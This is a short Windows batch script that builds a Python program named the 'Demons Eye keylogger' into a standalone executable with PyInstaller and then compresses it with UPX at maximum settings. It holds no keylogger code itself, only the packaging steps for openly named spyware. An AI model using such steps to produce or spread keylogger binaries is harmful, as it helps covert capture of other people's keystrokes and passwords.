@echo off
rem Executable creator for python code

echo Building Demons Eye keylogger
rem remove --noupx option if you want a compressed file.
rem but in the last tests compressend files do not work
rem pyinstaller -F --noupx --clean demonseye.py
pyinstaller -F --clean demonseye.py

rem Compress with UPX
del dist\demonseye-c.exe 
d:\apps\upx\upx --best -v --ultra-brute -odist\demonseye-c.exe dist\demonseye.exe

pause
